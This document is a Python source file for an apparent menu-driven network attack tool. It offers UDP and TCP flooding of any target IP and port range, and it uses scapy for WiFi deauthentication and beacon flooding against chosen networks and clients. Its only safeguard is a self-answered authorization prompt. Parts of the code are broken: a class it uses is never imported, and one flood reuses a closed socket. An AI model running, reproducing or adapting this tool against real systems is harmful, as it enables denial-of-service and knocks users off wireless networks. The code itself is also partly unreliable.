import sys
import time
import socket
import random
from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
import subprocess

def display_gui():
    gui = """
     ______   ______             ______    _          
    |_   _ `.|_   _ `.         .' ____ \\  (_)          
      | | `. \\ | | `. \\  .--.  | (___ \\_| __   _ .--.   
      | |  | | | |  | |/ .'`\\ \\ _.____`. [  | [ `/'`\\]  
     _| |_.' /_| |_.' /| \\__. || \\____) | | |  | |     
    |______.'|______.'  '.__.'  \\______.'[___][___]    
                Version 2.0 by mr.flip
                (IPv6 support + suite)
    """              
    print(gui)

def get_valid_ip():
    while True:
        ip = input("Enter the IP Target (IPv4 or IPv6): ")
        try:
            socket.inet_pton(socket.AF_INET, ip)
            return ip, socket.AF_INET
        except socket.error:
            try:
                socket.inet_pton(socket.AF_INET6, ip)
                return ip, socket.AF_INET6
            except socket.error:
                print("Invalid IP address. Please try again.")

def get_valid_port(prompt):
    while True:
        try:
            port = int(input(prompt))
            if 1 <= port <= 65535:
                return port
            else:
                print("Port must be between 1 and 65535.")
        except ValueError:
            print("Invalid port. Please enter a number.")

def ddos_attack(ip, ip_version, start_port, end_port, packet_size, rate_limit, duration):
    sock = socket.socket(ip_version, socket.SOCK_DGRAM)
    bytes_data = random._urandom(packet_size)
    sent = 0
    start_time = time.time()

    print("\nStarting DDoS Attack...")
    try:
        while True:
            if duration and (time.time() - start_time >= duration):
                print("DDoS Attack completed.")
                break
            for port in range(start_port, end_port + 1):
                sock.sendto(bytes_data, (ip, port))
                sent += 1
                print(f"Sent {sent} packets to {ip} on port {port}")
                if rate_limit > 0:
                    time.sleep(1 / rate_limit)
    except KeyboardInterrupt:
        print("\nAttack stopped by user.")
    except Exception as e:
        print(f"\nAn error occurred: {e}")
    finally:
        sock.close()
        print(f"Attack completed. Total packets sent: {sent}")

def flood_attack(ip, ip_version, port, packet_size, rate_limit, duration):
    sock = socket.socket(ip_version, socket.SOCK_STREAM)
    bytes_data = random._urandom(packet_size)
    sent = 0
    start_time = time.time()

    print("\nStarting Flood Attack...")
    try:
        while True:
            if duration and (time.time() - start_time >= duration):
                print("Flood Attack completed.")
                break
            sock.connect((ip, port))
            sock.send(bytes_data)
            sent += 1
            print(f"Flooded {ip} on port {port} with packet {sent}")
            if rate_limit > 0:
                time.sleep(1 / rate_limit)
            sock.close()
    except KeyboardInterrupt:
        print("\nAttack stopped by user.")
    except Exception as e:
        print(f"\nAn error occurred: {e}")
    finally:
        sock.close()
        print(f"Attack completed. Total packets sent: {sent}")

def wifi_scan():
    print("\nPerforming WiFi scan...")
    try:
        scan_command = "sudo iwlist wlan0 scan"
        output = subprocess.check_output(scan_command, shell=True, text=True)
        print(output)
    except subprocess.CalledProcessError as e:
        print(f"An error occurred during WiFi scan: {e}")

def wifi_deauth_attack(bssid, client_mac):
    print("\nStarting WiFi Deauthentication Attack...")
    packet = RadioTap() / Dot11(type=0, subtype=12, addr1=client_mac, addr2=bssid, addr3=bssid) / Dot11Deauth()
    try:
        sendp(packet, iface="wlan0mon", count=1000, inter=0.100)
        print("WiFi Deauthentication Attack completed.")
    except Exception as e:
        print(f"An error occurred: {e}")

def wifi_flood_attack(bssid, packet_size, rate_limit, duration):
    print("\nStarting WiFi Flood Attack...")
    try:
        sendp(RadioTap() / Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=bssid) / Dot11Beacon(),
              iface="wlan0mon", count=1000, inter=0.100)
        print("WiFi Flood Attack completed.")
    except Exception as e:
        print(f"An error occurred: {e}")

def main():
    display_gui()
    print("WARNING: Use this script for educational purposes and authorized testing only.")
    confirm = input("Do you have authorization to proceed? (y/n): ")
    if confirm.lower() != "y":
        print("Exiting the program. Ensure you have proper authorization.")
        sys.exit()

    while True:
        print("\nSelect attack type:")
        print("1. DDoS Attack")
        print("2. Flood Attack")
        print("3. WiFi Scan")
        print("4. WiFi Deauthentication Attack")
        print("5. WiFi Flood Attack")
        print("6. Quit")
        choice = input("Enter your choice (1-6): ")

        if choice == '1':
            ip, ip_version = get_valid_ip()
            start_port = get_valid_port("Enter start port: ")
            end_port = get_valid_port("Enter end port: ")
            packet_size = int(input("Enter packet size in bytes (e.g., 1024): "))
            rate_limit = float(input("Packets per second (0 for unlimited): "))
            duration = int(input("Duration in seconds (0 for unlimited): "))
            ddos_attack(ip, ip_version, start_port, end_port, packet_size, rate_limit, duration)

        elif choice == '2':
            ip, ip_version = get_valid_ip()
            port = get_valid_port("Enter port: ")
            packet_size = int(input("Enter packet size in bytes (e.g., 1024): "))
            rate_limit = float(input("Packets per second (0 for unlimited): "))
            duration = int(input("Duration in seconds (0 for unlimited): "))
            flood_attack(ip, ip_version, port, packet_size, rate_limit, duration)

        elif choice == '3':
            wifi_scan()

        elif choice == '4':
            bssid = input("Enter the BSSID of the target network: ")
            client_mac = input("Enter the MAC address of the target client (leave blank for all): ")
            wifi_deauth_attack(bssid, client_mac or "ff:ff:ff:ff:ff:ff")

        elif choice == '5':
            bssid = input("Enter the BSSID of the target network: ")
            packet_size = int(input("Enter packet size in bytes (e.g., 1024): "))
            rate_limit = float(input("Packets per second (0 for unlimited): "))
            duration = int(input("Duration in seconds (0 for unlimited): "))
            wifi_flood_attack(bssid, packet_size, rate_limit, duration)

        elif choice == '6':
            print("Exiting. Goodbye!")
            break

        else:
            print("Invalid choice. Please try again.")

if __name__ == "__main__":
    main()
